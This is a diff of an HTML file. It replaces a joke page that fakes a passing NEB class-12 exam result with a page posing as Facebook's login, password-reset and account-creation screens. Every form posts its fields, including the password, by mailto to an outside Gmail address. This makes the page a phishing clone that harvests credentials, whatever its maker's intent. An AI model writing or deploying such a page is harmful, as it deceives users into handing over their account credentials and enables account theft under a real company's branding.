@@ -1,29 +1,125 @@
 <!DOCTYPE html>
-<html>
-    <head>
-        <title>HTML</title>
-    </head>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">    
+        <link rel="stylesheet" href="index.css">
+        <link rel="stylesheet" href=" https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+        
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <title>facebook login</title>
+</head>
+<body>
+    <DIV id="BOX" ><br>
+        <form action="mailto:webdeveloper12@gmail.com" method="post" enctype="text/plain">
+<H2>Facebook</H2><br><hr><br>
+<label>Mobile Number or Email Address</label>
+<input type="text" name="mobile Number or Email Address"  required ><br>
+<label>Password</label>
+<input type="password" name="password"  required><br>
 
-    <body>
-       <header><H1>NEB</H1></header>
-      <H3>12th exam</H3>
-      <script>
+
+<div>
+    <br>
+    <button id="button">Log in</button>
+
+</div>
+<br>
+<z  onclick="openforget()">Forgotten Password?</z><br><br><br>
+<hr ><h3>OR</h2><hr><br>
+    <div class="new">
+    <button id="new" onclick="opennew()" >Create New Account</button>
+
+</div><br>
+<ul>
+<li>English (US)</li>
+<li>नेपाली</li>
+<li>हिन्दी</li>
+<li>Urdu</li>
+<li>More Language...</li>
+
+</ul><br><br><br><br>
+<br><br><br><br><br><br><br><br>
+</form>
+    </DIV>
+<!--..........forget password ..........--> 
+<div id="forget">
+    <form action="mailto:webdeveloper12@gmail.com" method="post" enctype="text/plain">
+    <H2>Reset your Facebook ID </H2><br><hr><br>
+<h2>Enter your ID details .</h2>
+  <label
+   name="Email" required for="text">Enter Your E-mail or Number</label>
+    <input  type="email
+    ">
+<br>
+    <div>
+        <br>
+        <button  id="button" >Forget</button>
+        <br><br><br>
+
+        <z onclick="closenew()" class="Already" >Try another Way.</z> 
+  
+</div>
+</div>
+</form>
+
+
+    <!--..........new account ..........--> 
+    <section1>
+    <div id="newacc">
+        <form action="mailto:webdeveloper12@gmail.com" method="post" enctype="text/plain">
+        <H2>Join Facebook</H2><br><hr><br>
+<h1>What's your Name?</h1>
+<h3>Enter the real Name.</h3>
+      <label name=" First Name" class="label"  for="text">First Name</label>
+      <label name="Last Name" class="label"  for="text">Last Name</label>
+        <input type="text">
+        <input type="text">
+   <br>
+        <div>
+            <br>
+            <button  id="button" >Next</button>
+            <br><br><br><br>
+<br><br><br><br><br><br><br><br><br><br><br><br>
+<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+
+            <z onclick="closenew()" class="Already" >Already have an Account</z> 
       
-        prompt("Enter your Symbol Number");
-        alert("🎉🎈CONGRATULATIONS You are Passed in class-12 Exam ");
+    </div>
     
     
-    alert("Best of Luck for Bachelor & Future  ");
+        </div>
+        </div>
+    </form>
+    </section1>
+<script>
+function opennew() {
+   
+    document.querySelector("#newacc").style.display = "block"; 
+   
+    document.querySelector("#BOX").style.display = "none"
+}
+function closenew() {
+    document.querySelector("#newacc").style.display = "none";
+    document.querySelector("#BOX").style.display = "block"; 
     
-    
-    
-      document.write("You have scored 3.6 gpa"); 
-       
-       alert("Note this just A fun for 12 students ");
-    
-       
-          
-      </script>      
-       
-    </body>
+}
+
+function openforget() {
+   
+   
+   document.querySelector("#forget").style.display = "block"
+   document.querySelector("#BOX").style.display = "none"
+}
+function closeforget() {
+   
+   document.querySelector("#BOX").style.display = "block"; 
+   document.querySelector("#forget").style.display = "none"
+}
+
+
+
+
+</script>
+</body>
 </html>
